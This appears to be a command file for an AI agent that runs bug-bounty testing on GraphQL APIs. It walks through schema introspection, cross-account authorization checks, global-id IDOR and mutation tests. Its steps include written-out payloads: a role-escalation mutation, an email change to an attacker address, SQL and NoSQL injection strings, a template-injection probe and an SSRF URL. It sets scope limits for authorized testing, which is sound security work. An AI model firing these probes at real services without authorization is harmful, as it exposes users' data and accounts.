---
description: Introspect a GraphQL endpoint and hunt field-level authz, global-id IDOR and mutation flaws.
argument-hint: <graphql url>
allowed-tools: Bash, Read, Write, WebFetch
---

# /bbw-graphql

`references/12`, `checklists/api-graphql.md`, `tools/graphql.py`.

**Input:** `$ARGUMENTS` — the GraphQL endpoint.

```
/bbw-graphql https://app.acme.com/graphql
```

Read-only by default. Never run a mutation that changes another user's data.

---

## Step 1 — Introspect

```bash
python tools/graphql.py https://<host>/bbw-graphql --introspect -o schema.json
python tools/graphql.py https://<host>/bbw-graphql --list-mutations
```

If it returns a schema you have every type, field, argument and mutation. Read it
like a menu and mark the fields that take an `id` or a `filter`.

If introspection is off:

```bash
python tools/graphql.py https://<host>/bbw-graphql --field-probe usr
```

`Did you mean "user"?` leaks names. Also try `__type(name:"Query")` directly, a
different path (`/graphql/v2`, `/api/graphql`), and GET-based introspection.

## Step 2 — Field-level authz (the main class)

Resolvers are per-field. A query with three fields may check one.

```graphql
{
  me { email role }
  user(id: "1043") { email phone role address { line1 city } }
}
```

Run it as account A with B's id. If B's data comes back, that is BOLA through
GraphQL — same severity as REST, often easier to hit because one query touches
several resolvers at once.

Also try: `viewer { ... }`, `users(first: 10) { ... }`, `organization(id:…)`,
`adminUsers`, `node(id:)`, and any field the schema marks as internal.

## Step 3 — Global id IDOR

Ids are usually `base64("User:1043")`. Decode, change, re-encode:

```bash
echo -n "User:1043" | base64        # VXNlcjoxMDQz
echo -n "User:1042" | base64        # VXNlcjoxMDQy
```

Then:

```graphql
{ node(id:"VXNlcjoxMDQy") { ... on User { email phone } } }
```

## Step 4 — Mutations

```graphql
mutation { updateUser(id:"1043", input:{role:"admin"}) { id role } }
mutation { updateProfile(input:{email:"attacker@x.com"}) { id } }
mutation { addMember(orgId:"<other>", userId:"<me>") { id } }
```

Only against objects you created. A mutation that accepts a role, an org id, or
another user's id without checking the caller is High.

## Step 5 — Injection through filters

Variables are JSON, but resolvers pass them on:

```graphql
{ users(filter:{name_contains:"' OR 1=1--"}) { id } }
{ search(q:"{{7*7}}") { id } }
{ preview(url:"http://<oast>/x") { html } }
```

NoSQL operators in a JSON filter (`{"$ne":null}`) and SSRF through a
URL-fetching field are both common.

## Step 6 — Errors, batching, CSRF

- Force an error: stack traces, DB names, resolver names.
- Alias batching (note only, do not abuse): `mutation { a: login(...) b: login(...) }`
- GET query or `Content-Type: text/plain` POST with a cookie session = CSRF-able.
- Deep nesting = DoS; skip unless the program pays for it.

---

## Output shape

```
introspection: on | off
types: N   queries: N   mutations: N
field-authz gaps: N   id IDOR: yes/no
worst: <query/mutation> — <data exposed>
next: /bbw-score then /bbw-report
```

## Stop conditions

- Every resolver checks ownership, including `node(id:)` → "closed", say it.
- A mutation would change another user's data → do not run it.
- Batching or depth attacks → out, unless explicitly in scope and paid.
